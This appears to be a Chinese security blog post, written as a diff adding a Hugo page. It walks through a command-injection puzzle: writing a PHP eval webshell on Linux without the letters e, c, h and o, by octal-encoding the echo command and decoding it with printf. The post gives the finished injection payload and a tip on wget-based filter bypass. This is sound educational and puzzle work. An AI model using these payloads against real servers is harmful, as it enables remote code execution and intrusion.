@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width">
+	<title>Linux 下的命令注入 &ndash; # alert`D0n9` ｜ 输攻墨守</title>
+	<link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/nav.css">
+    
+    
+    
+    
+    
+	<link rel="stylesheet" href="/css/themes/light.css">
+</head>
+<body>
+	<input class="show-hide-menu-input" style="display:none;" autocomplete="off" type="checkbox" id="toggle-1">
+	<label class="overlay" for="toggle-1"></label>
+	<div class="main">
+		<header class="header">
+			<div class="header-content">
+				<div class="title">
+					<a href="http://localhost:1313/"># alert`D0n9` ｜ 输攻墨守</a>
+				</div>
+				<div>
+					<div class="header-right">
+						<label id="show-hide-menu-label" class="clickable-header-label" for="toggle-1">
+							<img class="color-adapting-image" width="30" src="/images/hamburger.svg" alt="menu button">
+						</label>
+					</div>
+					<div class="dont-show">
+						<p>
+							Links:
+						</p>
+					</div>
+					<ul class="links">
+						<li><a href="/">Home</a></li>
+						<li><a href="/posts/">Posts</a></li>
+						<li><a href="/about-me/">About Me</a></li>
+						<li><a href="/tags/">Tags</a></li>
+					</ul>
+				</div>
+			</div>
+		</header>
+		<main class="body">
+			<div class="body-content">
+  <header class="title-header">
+    <h1>Linux 下的命令注入</h1>
+    <div class="title-header-date">
+        <time>Tuesday, September 20, 2016</time>
+    </div>
+    
+  </header>
+  <h2 id="linux-下的命令注入">Linux 下的命令注入<aside class="heading-anchor"><a href="#linux-下的命令注入" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h2>
+<blockquote>
+<p>之前发在微博上的一道题，首先投稿到了三哥的公众号然后发在了微博上，建立了这个 Blog 之后搬运过来。</p>
+</blockquote>
+<p><code>目标是Linux系统的命令注入，要求必须用echo命令写Webshell，但不能出现e、c、h、o这四个字符，cat、tee、wget、curl、less、more 这些带有关键字的都不行</code></p>
+<p>核心点是必须用echo，而且不能出现关键字，这样使用@zTrix 在阿里安全峰会演讲中的技巧就不行了，而且写PHP Webshell 的话，也是需要用到 h 的（echo &lsquo;<!-- raw HTML omitted -->&rsquo; &raquo; index.* 也可以这样写，但要开启短标签）</p>
+<p>所以第一想到的是通过编码，base64肯定是不行的，那如果是八进制呢？ (十六进制也行哦，但可能会包含E和C)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">八进制数的基数是8，采用0，1，2，3，4，5，6，7 八个数字。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">十六进制数的基数是16，采用的数码是0、1、2、3、4、5、6、7、8、9、A、B、C、D、E、F。
+</span></span></code></pre></div><p>八进制里面不会包含关键字，先尝试一下编码echo命令，然后使用<strong>printf</strong>进行解码</p>
+<p><img src="http://ww2.sinaimg.cn/large/6aa1af81gw1f6fnznjmchj20wn095wgz.jpg" alt=""></p>
+<p>bingo，成功把echo拿出来，那么接下来就很简单了吧，把整条写Webshell语句拿出来然后用**$()**执行</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#34;&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;&#34; &gt; shell.php
+</span></span><span class="line"><span class="cl">转换为八进制是
+</span></span><span class="line"><span class="cl">\145\143\150\157\40\42\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76\42\40\76\40\163\150\145\154\154\56\160\150\160
+</span></span></code></pre></div><p>$()这种写法是会优先执行括号里的内容，用来执行解码后的内容，然后图样图森破，echo的确被成功执行，但也把后面的内容全输出出来了，并没有写入。</p>
+<p><img src="http://ww2.sinaimg.cn/large/6aa1af81jw1f6gj7uviyjj20m0077n11.jpg" alt=""></p>
+<p>很尴尬，不过换成这样写就行了，先构造出来echo语句，然后重定向符放到外面，再利用通配符写入</p>
+<p><img src="http://ww4.sinaimg.cn/large/6aa1af81jw1f6gjgglenaj20lr05kwh3.jpg" alt=""></p>
+<p>但在测试的时候，又会发现问题，“ * ” 并没有被当作通配符去解释</p>
+<p><img src="http://ww3.sinaimg.cn/large/6aa1af81jw1f6gu82m3i4j20xx093whm.jpg" alt=""></p>
+<p>办法总是有的，完美的Payload如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vul=;$(printf &#34;\145\143\150\157\40\42\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76\42&#34;)&gt;&gt;`ls t*.*`
+</span></span></code></pre></div><p>使用上顿号执行一下，先构造出文件名</p>
+<p><img src="http://ww1.sinaimg.cn/large/6aa1af81jw1f6gtq9muytj20yb0aitc5.jpg" alt=""></p>
+<p>至此，不用e、c、h、o 这四个字符执行echo命令并写入Webshell 就搞定啦～</p>
+<p><img src="http://ww4.sinaimg.cn/large/6aa1af81jw1f6gtsz0i7tj20qg0fawj8.jpg" alt=""></p>
+<p>最后</p>
+<p>实战中这种蛋疼环境不可能遇到，即使遇到不能执行echo命令，相信各位也会有一百种Getshell的方法，过滤 &gt; `` &quot;&quot; \ $(). 等一系列特殊字符，还可以wget 2130706433（IP的数字地址）302跳转到ftp服务器自动下载，总之姿势有很多。</p>
+
+  
+  
+  <div class="post-tags">
+    <p>Tags: 
+    
+      <a href="/tags/rce">RCE</a>
+    
+      <a href="/tags/web%E5%AE%89%E5%85%A8">Web安全</a>
+    
+      <a href="/tags/linux">Linux</a>
+    
+      <a href="/tags/command-injection">Command Injection</a>
+    
+    </p>
+  </div>
+  
+
+			</div>
+		</main>
+	</div>
+	<hr class="dont-show">
+	<footer class="footer">
+		<p>Powered by <a href="https://gohugo.io/">Hugo</a> &amp; <a href="https://github.com/stevenengler/no-js-hugo-theme">no-js-hugo-theme</a></p>
+	</footer>
+</body>
+</html>
